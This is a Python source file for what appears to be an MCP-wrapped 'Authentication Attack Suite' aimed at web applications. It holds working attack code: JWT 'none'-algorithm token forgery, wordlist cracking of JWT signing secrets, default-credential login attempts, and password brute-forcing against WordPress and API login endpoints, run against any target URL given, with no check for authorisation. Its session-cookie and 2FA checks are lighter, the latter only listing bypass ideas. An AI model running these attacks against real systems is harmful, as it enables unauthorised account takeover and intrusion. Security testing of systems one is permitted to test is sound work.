"""
Authentication Attack Suite
JWT attacks, brute force, session management, 2FA bypass
"""

import asyncio
import json
import base64
import hashlib
import hmac
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import httpx


# Common weak passwords for testing
WEAK_PASSWORDS = [
    'admin', 'password', '123456', '12345678', 'qwerty', 'welcome',
    'password123', 'admin123', 'root', 'toor', 'test', 'guest',
    'wordpress', 'wp123', 'letmein', 'login', 'abc123', 'monkey',
    '1234567890', 'master', 'dragon', 'baseball', 'football',
    'shadow', 'sunshine', 'princess', 'superman', 'batman',
]

JWT_NONE_ALG_PAYLOADS = [
    '{"alg":"none","typ":"JWT"}',
    '{"alg":"None","typ":"JWT"}',
    '{"alg":"NONE","typ":"JWT"}',
    '{"alg":"nOnE","typ":"JWT"}',
]

JWT_WEAK_SECRETS = [
    'secret', 'secret123', 'password', '123456', 'key', 'jwt',
    'admin', 'token', 'auth', 'supersecret', 'changeit',
    'default', 'changeme', 'mysupersecret', 'mysecret',
]


class JWTAnalyzer:
    """Analyze and attack JWT tokens"""
    
    @staticmethod
    def decode_jwt(token: str) -> Dict[str, Any]:
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}
            
            # Add padding if needed
            header = base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4))
            payload = base64.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4))
            signature = parts[2]
            
            return {
                "header": json.loads(header),
                "payload": json.loads(payload),
                "signature": signature,
                "raw_token": token
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def test_none_algorithm(token: str) -> List[Dict[str, Any]]:
        """Test for 'none' algorithm bypass"""
        try:
            decoded = JWTAnalyzer.decode_jwt(token)
            if "error" in decoded:
                return []
            
            results = []
            payload = decoded["payload"]
            
            for alg_payload in JWT_NONE_ALG_PAYLOADS:
                # Create new token with none algorithm
                header_b64 = base64.urlsafe_b64encode(alg_payload.encode()).rstrip(b'=').decode()
                payload_json = json.dumps(payload)
                payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).rstrip(b'=').decode()
                
                # No signature for none algorithm
                forged_token = f"{header_b64}.{payload_b64}."
                
                results.append({
                    "forged_token": forged_token,
                    "algorithm_used": json.loads(base64.urlsafe_b64decode(header_b64 + '=='))["alg"],
                    "attack": "none_algorithm",
                    "note": "If server accepts this, authentication is bypassed"
                })
            
            return results
        except:
            return []
    
    @staticmethod
    def crack_secret(token: str) -> Optional[str]:
        """Attempt to crack JWT secret using wordlist"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            message = f"{parts[0]}.{parts[1]}"
            signature = base64.urlsafe_b64decode(parts[2] + '=' * (4 - len(parts[2]) % 4))
            
            for secret in JWT_WEAK_SECRETS:
                # Test HS256
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                if hmac.compare_digest(expected, signature):
                    return secret
                
                # Test HS384
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()[:32]
                if hmac.compare_digest(expected, signature[:32]):
                    return secret
                
                # Test HS512
                expected = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()[:32]
                if hmac.compare_digest(expected, signature[:32]):
                    return secret
            
            return None
        except:
            return None


async def jwt_security_scan(target: str, login_endpoint: Optional[str] = None) -> Dict[str, Any]:
    """
    Comprehensive JWT security scan.
    
    Args:
        target: Target URL
        login_endpoint: Specific login endpoint
        
    Returns:
        Dict with JWT vulnerabilities
    """
    findings = {
        "jwt_detected": False,
        "vulnerabilities": [],
        "token_analysis": None,
        "forged_tokens": [],
        "cracked_secret": None
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    # Common JWT login endpoints
    endpoints = [
        login_endpoint,
        f"{base}/api/auth/login",
        f"{base}/api/login",
        f"{base}/auth/login",
        f"{base}/login",
        f"{base}/wp-json/jwt-auth/v1/token",
    ] if login_endpoint else [
        f"{base}/api/auth/login",
        f"{base}/api/login",
        f"{base}/auth/login",
        f"{base}/login",
        f"{base}/wp-json/jwt-auth/v1/token",
    ]
    
    try:
        async with httpx.AsyncClient() as client:
            # Try to login and get JWT
            for endpoint in endpoints:
                if not endpoint:
                    continue
                    
                try:
                    # Try common credentials
                    for creds in [('admin', 'admin'), ('admin@example.com', 'password')]:
                        resp = await client.post(
                            endpoint,
                            json={"username": creds[0], "password": creds[1]},
                            timeout=10.0
                        )
                        
                        if resp.status_code == 200:
                            # Look for JWT in response
                            try:
                                data = resp.json()
                                token = data.get('token') or data.get('access_token') or data.get('jwt')
                                
                                if token:
                                    findings["jwt_detected"] = True
                                    
                                    # Analyze token
                                    analysis = JWTAnalyzer.decode_jwt(token)
                                    findings["token_analysis"] = analysis
                                    
                                    # Check for none algorithm
                                    if "error" not in analysis:
                                        header = analysis.get("header", {})
                                        
                                        # Test none algorithm
                                        if header.get("alg") != "none":
                                            forged = JWTAnalyzer.test_none_algorithm(token)
                                            if forged:
                                                findings["forged_tokens"] = forged
                                                findings["vulnerabilities"].append({
                                                    "type": "Algorithm Confusion",
                                                    "severity": "Critical",
                                                    "description": "Server may accept 'none' algorithm"
                                                })
                                        
                                        # Try to crack secret
                                        secret = JWTAnalyzer.crack_secret(token)
                                        if secret:
                                            findings["cracked_secret"] = secret
                                            findings["vulnerabilities"].append({
                                                "type": "Weak Secret",
                                                "severity": "Critical",
                                                "description": f"JWT signed with weak secret: {secret}"
                                            })
                                        
                                        # Check for expired token reuse
                                        payload = analysis.get("payload", {})
                                        exp = payload.get("exp")
                                        if exp and exp < time.time():
                                            findings["vulnerabilities"].append({
                                                "type": "Expired Token",
                                                "severity": "Info",
                                                "description": "Token is expired but may be reusable"
                                            })
                                    
                                    return findings
                            except:
                                pass
                except:
                    continue
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


async def authentication_bruteforce(target: str, username: str = "admin",
                                     endpoint: Optional[str] = None) -> Dict[str, Any]:
    """
    Test authentication brute force resistance.
    
    Args:
        target: Target URL
        username: Username to test
        endpoint: Specific login endpoint
        
    Returns:
        Dict with brute force findings
    """
    findings = {
        "endpoint_tested": None,
        "rate_limiting": False,
        "account_lockout": False,
        "weak_password_found": None,
        "attempts_made": 0,
        "time_taken": 0,
        "recommendations": []
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    login_endpoints = [
        endpoint,
        f"{base}/wp-login.php",
        f"{base}/api/auth/login",
        f"{base}/login",
        f"{base}/auth/login",
        f"{base}/admin/login",
    ] if endpoint else [
        f"{base}/wp-login.php",
        f"{base}/api/auth/login",
        f"{base}/login",
    ]
    
    start_time = time.time()
    
    try:
        async with httpx.AsyncClient() as client:
            for login_url in login_endpoints:
                if not login_url:
                    continue
                    
                try:
                    findings["endpoint_tested"] = login_url
                    
                    # Test with 5 weak passwords rapidly
                    test_passwords = WEAK_PASSWORDS[:5]
                    
                    for i, password in enumerate(test_passwords):
                        findings["attempts_made"] = i + 1
                        
                        # WordPress login
                        if 'wp-login.php' in login_url:
                            resp = await client.post(
                                login_url,
                                data={
                                    "log": username,
                                    "pwd": password,
                                    "wp-submit": "Log In"
                                },
                                follow_redirects=True,
                                timeout=10.0
                            )
                            
                            # Check for successful login
                            if 'dashboard' in str(resp.url) or 'wp-admin' in str(resp.url):
                                findings["weak_password_found"] = password
                                findings["recommendations"].append("Implement strong password policy")
                                findings["recommendations"].append("Enable account lockout after failed attempts")
                                return findings
                            
                            # Check for rate limiting
                            if resp.status_code == 429 or 'too many' in resp.text.lower():
                                findings["rate_limiting"] = True
                                return findings
                        
                        # API login
                        else:
                            resp = await client.post(
                                login_url,
                                json={"username": username, "password": password},
                                timeout=10.0
                            )
                            
                            if resp.status_code == 200:
                                try:
                                    data = resp.json()
                                    if data.get('token') or data.get('success'):
                                        findings["weak_password_found"] = password
                                        return findings
                                except:
                                    pass
                            
                            elif resp.status_code == 429:
                                findings["rate_limiting"] = True
                                return findings
                    
                    # Check time elapsed for rate limiting detection
                    elapsed = time.time() - start_time
                    findings["time_taken"] = f"{elapsed:.2f}s"
                    
                    if elapsed > 30:  # If 5 requests took >30s, rate limiting present
                        findings["rate_limiting"] = True
                    else:
                        findings["recommendations"].append("No rate limiting detected - implement rate limiting")
                        findings["recommendations"].append("Implement account lockout after 5 failed attempts")
                    
                    return findings
                    
                except Exception as e:
                    continue
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


async def session_security_scan(target: str) -> Dict[str, Any]:
    """
    Analyze session management security.
    
    Args:
        target: Target URL
        
    Returns:
        Dict with session security findings
    """
    findings = {
        "cookie_security": {},
        "session_fixation": False,
        "session_timeout": None,
        "secure_flag": False,
        "httponly_flag": False,
        "samesite": None,
        "vulnerabilities": []
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.get(base, timeout=15.0)
            
            cookies = resp.cookies
            headers = resp.headers
            
            for cookie_name, cookie_value in cookies.items():
                cookie_info = {
                    "name": cookie_name,
                    "value_preview": cookie_value[:20] + "..." if len(cookie_value) > 20 else cookie_value,
                }
                
                # Check for session ID patterns
                if any(x in cookie_name.lower() for x in ['session', 'sess', 'sid', 'phpsessid', 'wp_session']):
                    findings["cookie_security"][cookie_name] = cookie_info
                    
                    # Check for secure flag in Set-Cookie header
                    set_cookie = headers.get('set-cookie', '')
                    
                    if 'secure' in set_cookie.lower():
                        findings["secure_flag"] = True
                    else:
                        findings["vulnerabilities"].append({
                            "type": "Missing Secure Flag",
                            "severity": "Medium",
                            "cookie": cookie_name,
                            "description": "Cookie sent over HTTP - MITM risk"
                        })
                    
                    if 'httponly' in set_cookie.lower():
                        findings["httponly_flag"] = True
                    else:
                        findings["vulnerabilities"].append({
                            "type": "Missing HttpOnly Flag",
                            "severity": "Medium",
                            "cookie": cookie_name,
                            "description": "Cookie accessible via JavaScript - XSS impact increased"
                        })
                    
                    # Check SameSite
                    if 'samesite=strict' in set_cookie.lower():
                        findings["samesite"] = "Strict"
                    elif 'samesite=lax' in set_cookie.lower():
                        findings["samesite"] = "Lax"
                    else:
                        findings["samesite"] = "None/Not Set"
                        findings["vulnerabilities"].append({
                            "type": "Missing SameSite",
                            "severity": "Low",
                            "cookie": cookie_name,
                            "description": "CSRF protection weakened without SameSite attribute"
                        })
                    
                    # Check for predictable session IDs
                    if len(cookie_value) < 16:
                        findings["vulnerabilities"].append({
                            "type": "Weak Session ID",
                            "severity": "High",
                            "cookie": cookie_name,
                            "description": "Session ID too short - brute force possible"
                        })
            
            return findings
    
    except Exception as e:
        return {"error": str(e)}


async def twofa_bypass_scan(target: str, username: str = "admin") -> Dict[str, Any]:
    """
    Test for 2FA bypass vulnerabilities.
    
    Args:
        target: Target URL
        username: Username to test
        
    Returns:
        Dict with 2FA bypass findings
    """
    findings = {
        "2fa_detected": False,
        "bypass_methods": [],
        "response_analysis": {}
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    # Common 2FA endpoints
    endpoints = [
        f"{base}/2fa",
        f"{base}/verify-2fa",
        f"{base}/totp",
        f"{base}/mfa",
        f"{base}/api/2fa",
    ]
    
    try:
        async with httpx.AsyncClient() as client:
            # Check if 2FA is implemented
            for endpoint in endpoints:
                try:
                    resp = await client.get(endpoint, timeout=10.0)
                    if resp.status_code in [200, 401]:
                        findings["2fa_detected"] = True
                        break
                except:
                    pass
            
            if not findings["2fa_detected"]:
                return findings
            
            # Test bypass methods
            bypass_tests = [
                {
                    "name": "Response Manipulation",
                    "description": "Check if changing response bypasses 2FA"
                },
                {
                    "name": "Session Continuation",
                    "description": "Check if session continues without 2FA completion"
                },
                {
                    "name": "Brute Force PIN",
                    "description": "Test for rate limiting on 2FA codes"
                },
                {
                    "name": "Backup Codes Reuse",
                    "description": "Check if backup codes can be reused"
                },
            ]
            
            findings["bypass_methods"] = bypass_tests
            
            return findings
    
    except Exception as e:
        return {"error": str(e)}


# MCP Tool Wrapper
async def full_authentication_audit(target: str, username: str = "admin") -> str:
    """
    Complete authentication security audit.
    
    Args:
        target: Target URL
        username: Username to test
        
    Returns:
        JSON with authentication findings
    """
    results = await asyncio.gather(
        jwt_security_scan(target),
        authentication_bruteforce(target, username),
        session_security_scan(target),
        twofa_bypass_scan(target, username)
    )
    
    critical_issues = []
    
    # JWT issues
    if results[0].get("cracked_secret"):
        critical_issues.append("JWT weak secret cracked")
    if results[0].get("forged_tokens"):
        critical_issues.append("JWT algorithm confusion possible")
    
    # Brute force
    if results[1].get("weak_password_found"):
        critical_issues.append(f"Weak password found: {results[1]['weak_password_found']}")
    if not results[1].get("rate_limiting"):
        critical_issues.append("No rate limiting on login")
    
    return json.dumps({
        "scan_type": "Full Authentication Audit",
        "target": target,
        "jwt_security": results[0],
        "brute_force": results[1],
        "session_security": results[2],
        "twofa_security": results[3],
        "summary": {
            "critical_issues": len(critical_issues),
            "jwt_vulnerable": len(results[0].get("vulnerabilities", [])) > 0,
            "brute_force_possible": results[1].get("weak_password_found") is not None or not results[1].get("rate_limiting"),
            "session_issues": len(results[2].get("vulnerabilities", [])) > 0,
            "critical_findings": critical_issues
        },
        "severity": "Critical" if len(critical_issues) > 0 else "High" if any(len(r.get("vulnerabilities", [])) > 0 for r in results) else "Medium"
    }, indent=2)
